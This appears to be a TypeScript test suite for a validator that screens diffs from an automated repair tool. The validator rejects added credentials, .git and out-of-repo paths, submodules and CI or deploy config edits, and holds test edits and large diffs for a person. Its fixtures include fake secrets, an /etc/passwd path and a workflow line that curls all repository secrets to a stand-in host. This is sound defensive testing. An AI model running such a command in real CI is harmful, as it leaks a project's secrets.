import test from 'node:test';
import assert from 'node:assert/strict';
import { HELD, REJECTED, checkChanges, pathRules } from '../src/repair/changes.ts';

// A git diff --binary with a/ and b/ prefixes, as the repair box returns one.
const file = (path: string, added: string[], removed: string[] = [], { header = `diff --git a/${path} b/${path}`, from = `a/${path}`, to = `b/${path}` } = {}) =>
  [header, 'index 1111111..2222222 100644', `--- ${from}`, `+++ ${to}`, `@@ -1,${removed.length} +1,${added.length} @@`, ...removed.map(line => `-${line}`), ...added.map(line => `+${line}`)].join('\n');
const diff = (...files: string[]) => `${files.join('\n')}\n`;

test('a source fix passes the rules with its paths and changed lines', () => {
  const result = checkChanges(diff(file('src/add.js', ['module.exports = (a, b) => a + b;'], ['module.exports = (a, b) => a - b;'])));
  assert.deepEqual(result, { paths: ['src/add.js'], added: 1, removed: 1, rejected: [], holds: [] });
});

test('added credential text rejects the change; the same text removed, or a reference to a secret, does not', () => {
  for (const [path, line] of [
    ['src/config.ts', 'const token = "ghp_abcdefghijklmnopqrstuvwxyz0123";'], ['src/config.ts', "apiKey: 'sk-or-v1-0123456789abcdef'"], ['.env', 'DATABASE_URL=https://admin:hunter22@db.example.com/app'],
    ['src/config.ts', 'API_KEY="abcd1234efgh5678"'], ['.env', 'AWS_ACCESS_KEY=AKIAABCDEFGHIJKLMNOP'],
    // Names are read without regard to case, as redact() reads them.
    ['app/settings.py', 'db_password = "S3cretPassw0rd99"'], ['config/database.yml', '  password: S3cretPassw0rd99'], ['config/app.json', '  "password": "S3cretPassw0rd99"'],
    ['src/client.ts', 'const client = { apiKey: "abcdef0123456789abcdef" };'], ['deploy.env', 'secret_token=abcdef0123456789'],
  ]) {
    assert.deepEqual(checkChanges(diff(file(path, [line]))).rejected, [REJECTED.credential], `${path}: ${line}`);
  }
  assert.deepEqual(checkChanges(diff(file('src/config.ts', ['const x = 1;'], ['const token = "ghp_abcdefghijklmnopqrstuvwxyz0123";']))).rejected, []);
  for (const [path, line] of [
    ['ci/env.yml', '      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}'], ['src/config.ts', 'const API_KEY = process.env.API_KEY;'], ['src/config.ts', 'token: string;'], ['src/config.ts', 'headers.Authorization = `Bearer ${token}`;'],
    // In source code an unquoted value is an expression, such as a reference to the environment.
    ['app/settings.py', 'SECRET_KEY = os.environ["SECRET_KEY"]'], ['app/settings.py', "SECRET_KEY = os.environ.get('SECRET_KEY')"], ['src/env.js', '  API_KEY: process.env.API_KEY,'],
    ['src/env.ts', '  GITHUB_TOKEN: process.env.GITHUB_TOKEN'], ['src/auth.ts', 'const TOKEN_URL = "https://oauth2.example.com/token";'], ['config/app.yml', '  secret_file: /run/secrets/app'],
  ]) {
    assert.deepEqual(checkChanges(diff(file(path, [line]))).rejected, [], `${path}: ${line}`);
  }
});

test('a path through .git, outside the repository or a submodule rejects the change', () => {
  assert.deepEqual(checkChanges(diff(file('.git/hooks/pre-push', ['#!/bin/sh']))).rejected, [REJECTED.path]);
  assert.deepEqual(checkChanges(diff(file('pkg/.GIT/config', ['x']))).rejected, [REJECTED.path], 'Case does not hide .git.');
  assert.deepEqual(checkChanges(diff(file('../outside.txt', ['x']))).rejected, [REJECTED.path]);
  assert.deepEqual(checkChanges(diff(file('x', ['y'], [], { header: 'diff --git "a/sub/.git/config" "b/sub/.git/config"', from: '"a/sub/.git/config"', to: '"b/sub/.git/config"' }))).rejected, [REJECTED.path], 'Quoted paths are read.');
  const submodule = ['diff --git a/vendor/lib b/vendor/lib', 'new file mode 160000', 'index 0000000..abcdef1', '--- /dev/null', '+++ b/vendor/lib', '@@ -0,0 +1 @@', '+Subproject commit abcdef1234567890abcdef1234567890abcdef12'].join('\n');
  assert.deepEqual(checkChanges(submodule).rejected, [REJECTED.submodule]);
  assert.deepEqual(pathRules(['/etc/passwd', 'src/ok.ts']).rejected, [REJECTED.path]);
});

test('tests and a large change are held for a person, never rejected', () => {
  for (const path of ['test/add.test.js', 'packages/api/tests/users.py', 'src/__tests__/a.tsx', 'spec/models/user_spec.rb', 'src/add.test.ts', 'web/app.spec.tsx', 'pkg/server_test.go', 'test_utils.py']) {
    assert.deepEqual(pathRules([path]), { rejected: [], holds: [HELD.tests] }, path);
  }
  assert.deepEqual(pathRules(['src/testing.ts', 'src/specification.md', 'latest/x.ts']).holds, [], 'Only test folders and test files are tests.');
  const large = checkChanges(diff(file('src/big.ts', Array.from({ length: 300 }, (_, index) => `line ${index}`), Array.from({ length: 101 }, (_, index) => `old ${index}`))));
  assert.deepEqual([large.added, large.removed, large.rejected, large.holds], [300, 101, [], [HELD.size]]);
  const both = checkChanges(diff(file('src/a.ts', ['x']), file('test/a.test.ts', ['y'])));
  assert.deepEqual([both.paths, both.rejected, both.holds], [['src/a.ts', 'test/a.test.ts'], [], [HELD.tests]]);
});

// A pushed branch runs its own workflows with the repository's secrets, and deploy previews build from its configuration.
test('CI configuration and deploy configuration the scan found reject the change before it is pushed', () => {
  for (const path of ['.github/workflows/ci.yml', '.github/actions/setup/action.yml', '.github/dependabot.yml']) assert.deepEqual(pathRules([path]), { rejected: [REJECTED.delivery], holds: [] }, path);
  assert.deepEqual(pathRules(['web/vercel.json'], ['web/vercel.json']).rejected, [REJECTED.delivery]);
  assert.deepEqual(pathRules(['web/vercel.json']).rejected, [], 'Only deploy files the scan found count.');
  assert.deepEqual(checkChanges(diff(file('src/a.ts', ['x']), file('.github/workflows/ci.yml', ['      - run: curl -d "${{ toJSON(secrets) }}" https://x.example']))).rejected, [REJECTED.delivery]);
});

test('new, deleted and binary files are named by their headers', () => {
  const created = ['diff --git a/src/new.ts b/src/new.ts', 'new file mode 100644', 'index 0000000..3333333', '--- /dev/null', '+++ b/src/new.ts', '@@ -0,0 +1 @@', '+export const x = 1;'].join('\n');
  const binary = ['diff --git a/logo.png b/logo.png', 'new file mode 100644', 'index 0000000..4444444', 'GIT binary patch', 'literal 5', 'Mcmb=~hJOS@<+', '', 'literal 0', 'HcmV?d00001', ''].join('\n');
  const deleted = ['diff --git a/old.txt b/old.txt', 'deleted file mode 100644', 'index 5555555..0000000', '--- a/old.txt', '+++ /dev/null', '@@ -1 +0,0 @@', '-bye'].join('\n');
  const result = checkChanges(`${created}\n${binary}\n${deleted}\n`);
  assert.deepEqual([result.paths, result.added, result.removed, result.rejected], [['src/new.ts', 'logo.png', 'old.txt'], 1, 1, []]);
});
